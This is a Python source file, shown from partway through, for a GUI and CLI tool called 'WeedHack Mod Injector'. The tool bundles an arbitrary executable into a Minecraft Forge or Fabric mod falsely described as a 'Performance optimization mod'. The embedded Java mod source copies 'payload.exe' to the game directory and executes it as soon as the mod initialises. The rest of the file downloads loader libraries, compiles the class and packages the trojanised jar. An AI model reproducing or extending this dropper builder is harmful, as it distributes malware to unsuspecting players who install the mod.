            if os.path.exists(p):
                return p
    for p in os.environ.get("PATH", "").split(os.pathsep):
        for name in ("javac", "javac.exe"):
            fp = os.path.join(p, name)
            if os.path.exists(fp):
                return fp
    common = [
        r"C:\Program Files\Eclipse Adoptium\jdk-17\bin\javac.exe",
        r"C:\Program Files\Java\jdk-17\bin\javac.exe",
        r"C:\Program Files\Microsoft\jdk-17.0.15\bin\javac.exe",
        r"C:\Program Files\Eclipse Adoptium\jdk-21\bin\javac.exe",
    ]
    for p in common:
        if os.path.exists(p):
            return p
    return None

# ── Auto-download logic ──────────────────────────────────────────────────

def download_file(url, dest_path):
    """Download a file from *url* to *dest_path* with a simple progress indicator."""
    print(f"{NEON}  [~] Downloading: {url}{RESET}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "WeedHack/6.1"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            total = int(resp.headers.get("Content-Length", 0))
            downloaded = 0
            with open(dest_path, "wb") as f:
                while True:
                    chunk = resp.read(8192)
                    if not chunk:
                        break
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total:
                        pct = downloaded * 100 // total
                        print(f"{NEON}  [~]  {pct}% ({downloaded//1024} KiB / {total//1024} KiB)\r{RESET}", end="")
        print()
        print(f"{NEON}  [✓] Saved: {dest_path}{RESET}")
        return True
    except Exception as e:
        print(f"{NEON}  [!] Download failed: {e}{RESET}")
        return False


def extract_from_forge_installer(installer_path, mc_version, forge_ver):
    """
    Forge installers are zip files containing:
      - maven/net/minecraftforge/forge/<ver>/forge-<ver>-universal.jar  (pre-1.13)
      - maven/net/minecraftforge/forge/<ver>/forge-<ver>-client.jar    (1.13+)
    We extract the client/universal jar into .minecraft/libraries/.
    """
    lib_base = os.path.join(get_minecraft_dir(), "libraries")
    forge_path = f"net/minecraftforge/forge/{mc_version}-{forge_ver}"
    dest_dir = os.path.join(lib_base, forge_path)
    os.makedirs(dest_dir, exist_ok=True)

    found = False
    with zipfile.ZipFile(installer_path, "r") as z:
        for name in z.namelist():
            # Accept "forge-<ver>-universal.jar" or "forge-<ver>-client.jar"
            if name.startswith(f"maven/{forge_path}/") and name.endswith(".jar"):
                fname = os.path.basename(name)
                target = os.path.join(dest_dir, fname)
                if not os.path.exists(target):
                    print(f"{NEON}  [*] Extracting: {name}{RESET}")
                    with z.open(name) as src, open(target, "wb") as dst:
                        shutil.copyfileobj(src, dst)
                found = True

    if not found:
        # Fallback: try older universal layout
        alt_forge_path = f"net/minecraftforge/forge/{mc_version}-{forge_ver}-{mc_version}"
        alt_dest_dir = os.path.join(lib_base, alt_forge_path)
        os.makedirs(alt_dest_dir, exist_ok=True)
        with zipfile.ZipFile(installer_path, "r") as z:
            for name in z.namelist():
                if name.startswith(f"maven/{alt_forge_path}/") and name.endswith(".jar"):
                    fname = os.path.basename(name)
                    target = os.path.join(alt_dest_dir, fname)
                    if not os.path.exists(target):
                        print(f"{NEON}  [*] Extracting: {name}{RESET}")
                        with z.open(name) as src, open(target, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                    found = True

    return found


def download_forge_installer(mc_version):
    """Download the Forge installer for *mc_version* and return its path."""
    forge_ver = FORGE_VERSIONS.get(mc_version)
    if not forge_ver:
        print(f"{NEON}  [!] No known Forge version for MC {mc_version}{RESET}")
        return None

    # e.g. https://files.minecraftforge.net/maven/net/minecraftforge/forge/1.20.1-47.4.10/forge-1.20.1-47.4.10-installer.jar
    jar_name = f"forge-{mc_version}-{forge_ver}-installer.jar"
    url = f"{FORGE_MAVEN}/net/minecraftforge/forge/{mc_version}-{forge_ver}/{jar_name}"

    tmp_dir = tempfile.mkdtemp(prefix="wh_dl_")
    dest = os.path.join(tmp_dir, jar_name)

    if download_file(url, dest):
        # Extract the forge library jar from the installer
        ok = extract_from_forge_installer(dest, mc_version, forge_ver)
        if ok:
            print(f"{NEON}  [✓] Forge library extracted for MC {mc_version}{RESET}")
        else:
            print(f"{NEON}  [!] Could not find forge jar inside installer (may need manual install){RESET}")
    else:
        # Try the installer download page fallback
        print(f"{NEON}  [!] Direct download failed, trying adfly redirect...{RESET}")
        print(f"{NEON}  [*] Manually download from: https://files.minecraftforge.net/net/minecraftforge/forge/index_{mc_version}.html{RESET}")
        dest = None

    # Keep the temp dir alive – we only need the extracted libs
    return dest


def find_forge_libs(mc_version):
    base = get_minecraft_dir()
    lib_base = os.path.join(base, "libraries")
    forge_ver = FORGE_VERSIONS.get(mc_version, "47.4.10")
    
    jars = []
    # Search multiple Forge module paths
    forge_modules = [
        f"net/minecraftforge/forge/{mc_version}-{forge_ver}",
        f"net/minecraftforge/fmlcore/{mc_version}-{forge_ver}",
        f"net/minecraftforge/fmlloader/{mc_version}-{forge_ver}",
        f"net/minecraftforge/javafmllanguage/{mc_version}-{forge_ver}",
        f"net/minecraftforge/lowcodelanguage/{mc_version}-{forge_ver}",
        f"net/minecraftforge/mclanguage/{mc_version}-{forge_ver}",
    ]
    for mod_path in forge_modules:
        full_path = os.path.join(lib_base, mod_path)
        if os.path.exists(full_path):
            for f in os.listdir(full_path):
                if f.endswith(".jar") and "sources" not in f and "javadoc" not in f:
                    jars.append(os.path.join(full_path, f))
    
    return jars


# ── Fabric library handling ──────────────────────────────────────────────

def download_fabric_loader(mc_version):
    """Download fabric-loader jar from maven.fabricmc.net."""
    loader_ver = FABRIC_LOADER_VERSIONS.get(mc_version)
    if not loader_ver:
        print(f"{NEON}  [!] No known Fabric loader version for MC {mc_version}{RESET}")
        return False

    lib_base = os.path.join(get_minecraft_dir(), "libraries")
    # Maven path: net/fabricmc/fabric-loader/<ver>/fabric-loader-<ver>.jar
    maven_path = f"net/fabricmc/fabric-loader/{loader_ver}"
    dest_dir = os.path.join(lib_base, maven_path)
    os.makedirs(dest_dir, exist_ok=True)

    jar_name = f"fabric-loader-{loader_ver}.jar"
    target = os.path.join(dest_dir, jar_name)

    if os.path.exists(target):
        print(f"{NEON}  [*] Fabric loader already exists: {target}{RESET}")
        return True

    url = f"{FABRIC_MAVEN}/{maven_path}/{jar_name}"
    return download_file(url, target)


def find_fabric_libs(mc_version):
    """Find Fabric loader JARs for *mc_version*."""
    base = get_minecraft_dir()
    lib_base = os.path.join(base, "libraries")
    loader_ver = FABRIC_LOADER_VERSIONS.get(mc_version)

    jars = []

    # fabric-loader
    loader_dir = os.path.join(lib_base, "net", "fabricmc", "fabric-loader")
    if os.path.exists(loader_dir):
        for folder in os.listdir(loader_dir):
            # Accept the specific version or any
            if loader_ver and folder != loader_ver:
                continue
            vp = os.path.join(loader_dir, folder)
            if not os.path.isdir(vp):
                continue
            for f in os.listdir(vp):
                if f.endswith(".jar") and "sources" not in f and "javadoc" not in f:
                    jars.append(os.path.join(vp, f))

    return jars


# ── Unified library resolution ───────────────────────────────────────────

def ensure_libs(mod_type, mc_version):
    """Ensure the required library JARs exist, downloading if needed."""
    if mod_type == "forge":
        jars = find_forge_libs(mc_version)
        if not jars:
            print(f"{NEON}  [*] No Forge libraries found locally. Downloading...{RESET}")
            download_forge_installer(mc_version)
            jars = find_forge_libs(mc_version)
            if not jars:
                print(f"{NEON}  [!] Still no Forge libraries. Tried downloading installer.{RESET}")
                print(f"{NEON}  [*] You may need to run the Forge installer manually first.{RESET}")
    elif mod_type == "fabric":
        jars = find_fabric_libs(mc_version)
        if not jars:
            print(f"{NEON}  [*] No Fabric libraries found locally. Downloading...{RESET}")
            ok = download_fabric_loader(mc_version)
            if ok:
                jars = find_fabric_libs(mc_version)
            if not jars:
                print(f"{NEON}  [!] Could not obtain Fabric loader libraries.{RESET}")
    else:
        jars = []
    return jars


# ── Build logic ──────────────────────────────────────────

def build_mod(exe_path, mod_type="forge", mc_version="1.20.1"):
    tmp = tempfile.mkdtemp(prefix="wh_")
    try:
        src_dir = os.path.join(tmp, "src")
        build_dir = os.path.join(tmp, "build")
        assets_dir = os.path.join(tmp, "assets", "weedhack")
        meta_dir = os.path.join(tmp, "META-INF")

        os.makedirs(src_dir)
        os.makedirs(build_dir)
        os.makedirs(assets_dir)
        os.makedirs(meta_dir)

        shutil.copy2(exe_path, os.path.join(assets_dir, "payload.exe"))

        pkg_dir = os.path.join(src_dir, "net", "weedhack")
        os.makedirs(pkg_dir)

        # ── Write Java source ────────────────────────────────────────
        if mod_type == "forge":
            java_source = '''\
package net.weedhack;

import java.io.*;
import java.nio.file.*;

@net.minecraftforge.fml.common.Mod("weedhack")
public class WeedHackMod {
    public WeedHackMod() {
        try {
            String userDir = System.getProperty("user.dir");
            Path exePath = Paths.get(userDir, "weedhack_payload.exe");
            InputStream in = getClass().getResourceAsStream("/assets/weedhack/payload.exe");
            if (in != null) {
                Files.copy(in, exePath, StandardCopyOption.REPLACE_EXISTING);
                exePath.toFile().setExecutable(true);
                Runtime.getRuntime().exec(exePath.toAbsolutePath().toString());
                in.close();
            }
        } catch (Exception e) {
            System.err.println("[WeedHack] Error: " + e.getMessage());
        }
    }
}
'''
        else:  # fabric
            java_source = '''\
package net.weedhack;

import net.fabricmc.api.ModInitializer;
import java.io.*;
import java.nio.file.*;

public class WeedHackMod implements ModInitializer {
    @Override
    public void onInitialize() {
        try {
            String userDir = System.getProperty("user.dir");
            Path exePath = Paths.get(userDir, "weedhack_payload.exe");
            InputStream in = getClass().getResourceAsStream("/assets/weedhack/payload.exe");
            if (in != null) {
                Files.copy(in, exePath, StandardCopyOption.REPLACE_EXISTING);
                exePath.toFile().setExecutable(true);
                Runtime.getRuntime().exec(exePath.toAbsolutePath().toString());
                in.close();
            }
        } catch (Exception e) {
            System.err.println("[WeedHack] Error: " + e.getMessage());
        }
    }
}
'''

        with open(os.path.join(pkg_dir, "WeedHackMod.java"), "w") as f:
            f.write(java_source)

        # ── Write mod metadata ───────────────────────────────────────
        if mod_type == "forge":
            with open(os.path.join(meta_dir, "mods.toml"), "w") as f:
                f.write(make_forge_toml(mc_version))
        else:
            with open(os.path.join(tmp, "fabric.mod.json"), "w") as f:
                f.write(make_fabric_json(mc_version))

        # ── Write pack.mcmeta (prevents resource pack errors) ────────
        pack_format_map = {
            "1.20.1": 15,
            "1.19.4": 12,
            "1.19.2": 9,
            "1.18.2": 8,
            "1.16.5": 6,
        }
        pf = pack_format_map.get(mc_version, 15)
        pack_meta = '{\n  "pack": {\n    "description": "WeedHack mod resources",\n    "pack_format": ' + str(pf) + '\n  }\n}\n'
        with open(os.path.join(tmp, "pack.mcmeta"), "w") as f:
            f.write(pack_meta)

        # ── Find javac ──────────────────────────────────────────────
        javac = find_javac()
        if not javac:
            print(f"{NEON}  [!] javac not found! Install JDK 17{RESET}")
            return None
        print(f"{NEON}  [*] Using javac: {javac}{RESET}")

        # ── Auto-download / find libraries ──────────────────────────
        classpath = ensure_libs(mod_type, mc_version)
        if classpath:
            print(f"{NEON}  [*] Found {mod_type} libs:{RESET}")
            for j in classpath:
                print(f"{NEON}      {os.path.basename(j)}{RESET}")
        else:
            print(f"{NEON}  [!] No {mod_type} libraries found. Compilation may fail.{RESET}")

        # ── Compile ─────────────────────────────────────────────────
        cmd = [javac, "-source", "17", "-target", "17", "-d", build_dir]
        if classpath:
            sep = ";" if sys.platform == "win32" else ":"
            cmd.extend(["-cp", sep.join(classpath)])
        cmd.append(os.path.join(pkg_dir, "WeedHackMod.java"))

        print(f"{NEON}  [*] Compiling...{RESET}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode != 0:
            print(f"{NEON}  [!] Compilation failed:{RESET}")
            for line in result.stderr.split("\n"):
                if line.strip():
                    print(f"{NEON}    {line}{RESET}")
            return None

        class_file = os.path.join(build_dir, "net", "weedhack", "WeedHackMod.class")
        if not os.path.exists(class_file):
            print(f"{NEON}  [!] Class file not found{RESET}")
            return None

        # ── Package JAR ─────────────────────────────────────────────
        # Save output next to the script, or next to the exe if running as exe
        if getattr(sys, 'frozen', False):       # ← 8 spaces (2 tabs)
            # Running as PyInstaller exe          # ← 12 spaces (3 tabs)
            base_dir = Path(sys.executable).parent.resolve()  # ← 12 spaces
        else:                                       # ← 8 spaces
            # Running as script                     # ← 12 spaces
            base_dir = Path(__file__).parent.resolve()  # ← 12 spaces

        dist_dir = base_dir / "dist"                # ← 8 spaces
        dist_dir.mkdir(exist_ok=True)               # ← 8 spaces
        out_name = f"weedhack_{mod_type}_{mc_version}.jar"  # ← 8 spaces
        result_path = str(dist_dir / out_name)      # ← 8 spaces

        with zipfile.ZipFile(result_path, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("META-INF/MANIFEST.MF",
                       "Manifest-Version: 1.0\nCreated-By: WeedHack v6.1\n")
            z.write(os.path.join(tmp, "pack.mcmeta"), "pack.mcmeta")
            if mod_type == "forge":
                z.write(os.path.join(meta_dir, "mods.toml"), "META-INF/mods.toml")
            else:
                z.write(os.path.join(tmp, "fabric.mod.json"), "fabric.mod.json")
            z.write(class_file, "net/weedhack/WeedHackMod.class")
            z.write(os.path.join(assets_dir, "payload.exe"), "assets/weedhack/payload.exe")

        size = os.path.getsize(result_path)
        print(f"{NEON}  [*] Class: {os.path.getsize(class_file):,} bytes{RESET}")
        print(f"{NEON}  [✓] MOD: {result_path} ({size:,} bytes){RESET}")

        javap = shutil.which("javap")
        if javap:
            try:
                r = subprocess.run([javap, "-v", class_file],
                                   capture_output=True, text=True, timeout=10)
                if r.returncode == 0:
                    print(f"{NEON}  [*] javap:{RESET}")
                    for line in r.stdout.split("\n")[:25]:
                        print(f"{NEON}    {line}{RESET}")
            except Exception:
                pass

        return result_path

    except subprocess.TimeoutExpired:
        print(f"{NEON}  [!] Compilation timed out{RESET}")
        return None
    except Exception as e:
        print(f"{NEON}  [!] Error: {e}{RESET}")
        traceback.print_exc()
        return None
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ── Metadata templates ───────────────────────────────────────────────────

FORGE_TOML_TEMPLATES = {
    "1.20.1": {"lv": "[47,)", "fr": "[47,)", "mc": "[1.20.1]"},
    "1.19.4": {"lv": "[45,)", "fr": "[45,)", "mc": "[1.19.4]"},
    "1.19.2": {"lv": "[43,)", "fr": "[43,)", "mc": "[1.19.2]"},
    "1.18.2": {"lv": "[40,)", "fr": "[40,)", "mc": "[1.18.2]"},
    "1.16.5": {"lv": "[36,)", "fr": "[36,)", "mc": "[1.16.5]"},
}

FABRIC_TEMPLATES = {
    "1.20.1": {"mc": ">=1.20.1", "ld": ">=0.14.0"},
    "1.19.4": {"mc": ">=1.19.4", "ld": ">=0.14.0"},
    "1.19.2": {"mc": ">=1.19.2", "ld": ">=0.14.0"},
    "1.18.2": {"mc": ">=1.18.2", "ld": ">=0.14.0"},
    "1.16.5": {"mc": ">=1.16.5", "ld": ">=0.14.0"},
}


def make_forge_toml(version):
    t = FORGE_TOML_TEMPLATES.get(version, FORGE_TOML_TEMPLATES["1.20.1"])
    return (
        'modLoader="javafml"\n'
        f'loaderVersion="{t["lv"]}"\n'
        'license="MIT"\n'
        '\n'
        '[[mods]]\n'
        'modId="weedhack"\n'
        'version="1.0.0"\n'
        'displayName="WeedHack"\n'
        'description="Performance optimization mod"\n'
        'authors="WeedTeam"\n'
        '\n'
        '[[dependencies.weedhack]]\n'
        'modId="forge"\n'
        'mandatory=true\n'
        f'versionRange="{t["fr"]}"\n'
        'ordering="NONE"\n'
        'side="BOTH"\n'
        '\n'
        '[[dependencies.weedhack]]\n'
        'modId="minecraft"\n'
        'mandatory=true\n'
        f'versionRange="{t["mc"]}"\n'
        'ordering="NONE"\n'
        'side="BOTH"\n'
    )


def make_fabric_json(version):
    t = FABRIC_TEMPLATES.get(version, FABRIC_TEMPLATES["1.20.1"])
    return json.dumps({
        "schemaVersion": 1,
        "id": "weedhack",
        "version": "1.0.0",
        "name": "WeedHack",
        "description": "Perf mod",
        "authors": ["WeedTeam"],
        "environment": "*",
        "entrypoints": {"main": ["net.weedhack.WeedHackMod"]},
        "depends": {
            "fabricloader": t["ld"],
            "minecraft": t["mc"]
        }
    }, indent=2)


# ── GUI ──────────────────────────────────────────────────────────────────

class App:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("WeedHack Mod Injector v6.1")
        self.root.geometry("560x420")
        self.root.resizable(False, False)
        self.root.configure(bg='#0a0a0a')

        # Color scheme
        self.BG = '#0a0a0a'
        self.BG2 = '#141414'
        self.BG3 = '#1a1a1a'
        self.FG = '#e0e0e0'
        self.FG2 = '#888888'
        self.GREEN = '#00ff41'
        self.GREEN_DIM = '#00aa2a'
        self.GREEN_DARK = '#005a15'
        self.ACCENT = '#003300'

        self.mod_type = tk.StringVar(value="forge")
        self.mc_version = tk.StringVar(value="1.20.1")
        self.exe_path = tk.StringVar()
        self._build()

    def _build(self):
        root = self.root

        # Title bar
        title_frame = tk.Frame(root, bg=self.BG2, height=50)
        title_frame.pack(fill=tk.X, pady=(0, 10))
        title_frame.pack_propagate(False)

        tk.Label(title_frame, text="⛏ WEEDHACK", font=("Consolas", 18, "bold"),
                 bg=self.BG2, fg=self.GREEN).pack(side=tk.LEFT, padx=20, pady=8)
        tk.Label(title_frame, text="MOD INJECTOR v6.1", font=("Consolas", 10),
                 bg=self.BG2, fg=self.FG2).pack(side=tk.LEFT, padx=(0, 20), pady=8)

        # Separator
        sep = tk.Frame(root, height=2, bg=self.GREEN_DIM)
        sep.pack(fill=tk.X, padx=15)

        # Main content
        content = tk.Frame(root, bg=self.BG)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        # Loader selection
        lf = tk.LabelFrame(content, text=" LOADER ", font=("Consolas", 10, "bold"),
                           bg=self.BG, fg=self.GREEN, padx=10, pady=8,
                           relief=tk.FLAT, bd=0, highlightbackground=self.GREEN_DIM,
                           highlightthickness=1, foreground=self.GREEN)
        lf.pack(fill=tk.X, pady=(0, 8))

        radio_frame = tk.Frame(lf, bg=self.BG)
        radio_frame.pack()
        for val, txt in [("forge", "Forge"), ("fabric", "Fabric")]:
            rb = tk.Radiobutton(radio_frame, text=txt, variable=self.mod_type, value=val,
                                font=("Consolas", 11), bg=self.BG, fg=self.FG,
                                selectcolor=self.BG, activebackground=self.BG,
                                activeforeground=self.GREEN,
                                highlightthickness=0, bd=0)
            rb.pack(side=tk.LEFT, padx=15)
            rb.config(tristatevalue=0)

            def make_indicator(rb=rb, val=val):
                def track(*_):
                    rb.config(fg=self.GREEN if self.mod_type.get() == val else self.FG)
                self.mod_type.trace_add('write', track)
                track()

            make_indicator()

        # MC Version
        vf = tk.LabelFrame(content, text=" MC VERSION ", font=("Consolas", 10, "bold"),
                           bg=self.BG, fg=self.GREEN, padx=10, pady=8,
                           relief=tk.FLAT, bd=0, highlightbackground=self.GREEN_DIM,
                           highlightthickness=1)
        vf.pack(fill=tk.X, pady=(0, 8))

        versions = ["1.20.1", "1.19.4", "1.19.2", "1.18.2", "1.16.5"]
        combo = ttk.Combobox(vf, textvariable=self.mc_version, values=versions,
                             state="readonly", width=12, font=("Consolas", 10))
        combo.pack(pady=2)

        # Style the combobox
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TCombobox',
                        fieldbackground=self.BG3,
                        background=self.BG3,
                        foreground=self.GREEN,
                        arrowcolor=self.GREEN,
                        bordercolor=self.GREEN_DIM,
                        lightcolor=self.GREEN_DIM,
                        darkcolor=self.GREEN_DIM,
                        selectbackground=self.BG3,
                        selectforeground=self.GREEN)

        # Payload selection
        pf = tk.LabelFrame(content, text=" PAYLOAD EXE ", font=("Consolas", 10, "bold"),
                           bg=self.BG, fg=self.GREEN, padx=10, pady=8,
                           relief=tk.FLAT, bd=0, highlightbackground=self.GREEN_DIM,
                           highlightthickness=1)
        pf.pack(fill=tk.X, pady=(0, 10))

        entry_frame = tk.Frame(pf, bg=self.BG)
        entry_frame.pack(fill=tk.X)

        entry = tk.Entry(entry_frame, textvariable=self.exe_path, font=("Consolas", 9),
                         bg=self.BG3, fg=self.FG, insertbackground=self.GREEN,
                         relief=tk.FLAT, bd=2, highlightbackground=self.GREEN_DIM,
                         highlightcolor=self.GREEN, highlightthickness=1)
        entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8), ipady=4)

        browse_btn = tk.Button(entry_frame, text="BROWSE", command=self._browse,
                               font=("Consolas", 9, "bold"),
                               bg=self.GREEN_DARK, fg=self.GREEN,
                               activebackground=self.GREEN_DIM, activeforeground='#000000',
                               relief=tk.FLAT, bd=0, padx=12, pady=4,
                               cursor="hand2")
        browse_btn.pack(side=tk.RIGHT)

        # Build button
        self.btn_frame = tk.Frame(content, bg=self.BG)
        self.btn_frame.pack(pady=(5, 5))

        self.btn = tk.Button(self.btn_frame, text="▶ BUILD MOD", command=self._build_mod,
                             font=("Consolas", 14, "bold"),
                             bg=self.ACCENT, fg=self.GREEN,
                             activebackground=self.GREEN_DIM, activeforeground='#000000',
                             relief=tk.FLAT, bd=2, padx=30, pady=10,
                             highlightbackground=self.GREEN_DIM,
                             highlightcolor=self.GREEN,
                             highlightthickness=1, cursor="hand2")
        self.btn.pack()

        # Hover effect
        def on_enter(e):
            self.btn.config(bg=self.GREEN_DIM, fg='#000000')

        def on_leave(e):
            self.btn.config(bg=self.ACCENT, fg=self.GREEN)

        self.btn.bind("<Enter>", on_enter)
        self.btn.bind("<Leave>", on_leave)

        # Status bar
        sep2 = tk.Frame(root, height=1, bg=self.GREEN_DARK)
        sep2.pack(fill=tk.X, padx=15, pady=(5, 3))

        status_frame = tk.Frame(root, bg=self.BG)
        status_frame.pack(fill=tk.X, padx=20, pady=(0, 8))

        self.status_led = tk.Label(status_frame, text="●", font=("Consolas", 12),
                                   bg=self.BG, fg=self.GREEN_DIM)
        self.status_led.pack(side=tk.LEFT, padx=(0, 5))

        self.status = tk.StringVar(value="Ready")
        tk.Label(status_frame, textvariable=self.status, font=("Consolas", 9),
                 bg=self.BG, fg=self.FG2).pack(side=tk.LEFT)

    def _browse(self):
        p = filedialog.askopenfilename(title="Select EXE",
                                       filetypes=[("EXE", "*.exe"), ("*", "*.*")])
        if p:
            self.exe_path.set(p)

    def _build_mod(self):
        if not self.exe_path.get() or not os.path.isfile(self.exe_path.get()):
            messagebox.showerror("Error", "Select a valid EXE file!")
            return
        self.btn.config(state=tk.DISABLED, text="⏳ BUILDING...")
        self.status.set("Checking libraries & compiling...")
        self.status_led.config(fg='#ffaa00')
        self.root.update()

        def go():
            try:
                r = build_mod(self.exe_path.get(), self.mod_type.get(), self.mc_version.get())
                self.root.after(0, lambda: self._done(r))
            except Exception as e:
                self.root.after(0, lambda: self._err(str(e)))

        threading.Thread(target=go, daemon=True).start()

    def _done(self, r):
        self.btn.config(state=tk.NORMAL, text="▶ BUILD MOD")
        if r:
            self.status.set(f"SUCCESS: {os.path.basename(r)}")
            self.status_led.config(fg=self.GREEN)
            messagebox.showinfo("Success",
                                f"Mod created!\n{r}\n\nDrop in mods/ folder.")
        else:
            self.status.set("FAILED")
            self.status_led.config(fg='#ff3333')
            messagebox.showerror("Error",
                                 "Build failed - check console output")

    def _err(self, m):
        self.btn.config(state=tk.NORMAL, text="▶ BUILD MOD")
        self.status.set(f"ERROR: {m[:50]}")
        self.status_led.config(fg='#ff3333')
        messagebox.showerror("Error", m)

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--cli":
        exe = input(f"{NEON}  EXE path: {RESET}").strip().strip("'\"")
        if not os.path.isfile(exe):
            print(f"{NEON}  [!] File not found{RESET}")
            sys.exit(1)
        t = input(f"{NEON}  [F]orge or F[a]bric? (F/a): {RESET}").strip().lower()
        mt = "fabric" if t == "a" else "forge"
        v = input(f"{NEON}  MC version (default 1.20.1): {RESET}").strip() or "1.20.1"
        build_mod(exe, mt, v)
    else:
        App().run()
